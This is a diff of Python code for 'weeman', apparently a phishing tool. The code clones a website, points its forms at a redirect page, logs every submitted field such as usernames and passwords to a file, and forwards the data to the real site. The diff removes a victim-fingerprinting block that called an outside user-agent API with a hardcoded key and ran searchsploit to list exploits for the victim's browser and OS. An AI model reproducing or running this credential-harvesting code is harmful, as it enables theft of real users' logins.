@@ -17,8 +17,6 @@ from core.config import __version__
 from core.config import __codename__
 from core.misc import printt
 from lib.bs4 import BeautifulSoup as bs
-## Additional dependencies
-import requests, urllib, os
 
 class handler(SimpleHTTPServer.SimpleHTTPRequestHandler):
     ## Set server version
@@ -26,11 +24,7 @@ class handler(SimpleHTTPServer.SimpleHTTPRequestHandler):
     """
         Log message handler for simple HTTP server.
     """
-
     def do_POST(self):
-	#Setup redirect
-	os.system('cp redirect.html.orig redirect.html')
-	
         post_request = []
         printt(3, "%s - sent POST request." %self.address_string())
         form = cgi.FieldStorage(self.rfile,
@@ -38,46 +32,25 @@ class handler(SimpleHTTPServer.SimpleHTTPRequestHandler):
         environ={'REQUEST_METHOD':'POST',
                  'CONTENT_TYPE':self.headers['Content-Type'],})
         try:
+            
             from core.shell import url
             
             logger = open("%s.log" %url.replace("https://", "").replace("http://", "").split("/")[0], "a")
             logger.write("\n## %s - Data for %s\n\n" %(time.strftime("%H:%M:%S - %d/%m/%y"), url))
             
-	    ## Get the User-Agent header and query useragentapi for json information regarding the browser
-    	    user_agent = urllib.quote_plus(self.headers['User-Agent'])
-            ## UserAgentAPI Account registered for up to 1000 calls per day
-	    ## If more are needed register a new APIKEY 
-	    apikey = '8c21e71c'
-	    r = requests.get('https://useragentapi.com/api/v3/json/'+apikey+'/'+user_agent)
-            printt(2, "Operating System: "+r.json()[u'data'][u'platform_name']+" "+r.json()[u'data'][u'platform_version'])
-	    printt(2, "Browser: "+r.json()[u'data'][u'browser_name']+" "+r.json()[u'data'][u'browser_version'])
-	    printt(2, "Platform: "+r.json()[u'data'][u'platform_type'])
-	    # printt(2, "Rendering Engine: "+r.json()[u'data'][u'engine_name']+" "+r.json()[u'data'][u'engine_version']) 
-	    
-	    printt(2, "Potential Metasploit Modules:")
-		    
-	    os.system('searchsploit '+r.json()[u'data'][u'platform_name']+' '+r.json()[u'data'][u'platform_version'])
-	    os.system('searchsploit '+r.json()[u'data'][u'browser_name']+' '+r.json()[u'data'][u'browser_version'])
-
-	    ## Check HTTP_ACCEPT for Flash
-	    if ('flash' in self.headers['Accept']) or ('flash' in self.headers['Accept']):
-	        printt(2, "Flash found: "+self.headers['Accept'])
-	    else:
-		printt(2, "Flash not found")
-
             for tag in form.list:
                 tmp = str(tag).split("(")[1]
                 key,value = tmp.replace(")", "").replace("\'", "").replace(",", "").split()
                 post_request.append("%s %s" %(key,value))
                 printt(2, "%s => %s" %(key,value))
                 logger.write("%s => %s\n" %(key,value))
-		print tag
             logger.close()
             
             from core.shell import action_url
             
             create_post(url,action_url, post_request)
             SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)
+        
         except socerr as e:
             printt(3, "%s igonring ..." %str(e))
         except Exception as e:
@@ -97,8 +70,8 @@ class weeman(object):
     """
         weeman Object 
     """
-    def __init__(self, url,port):        
-
+    def __init__(self, url,port):
+        
         from core.shell import url
         from core.shell import port
         
@@ -144,7 +117,6 @@ class weeman(object):
         for tag in data.find_all("form"):
             tag['method'] = "post"
             tag['action'] = "redirect.html"
-
 
         # Replace path with full path with the URL
         for tag in data.find_all("a"):
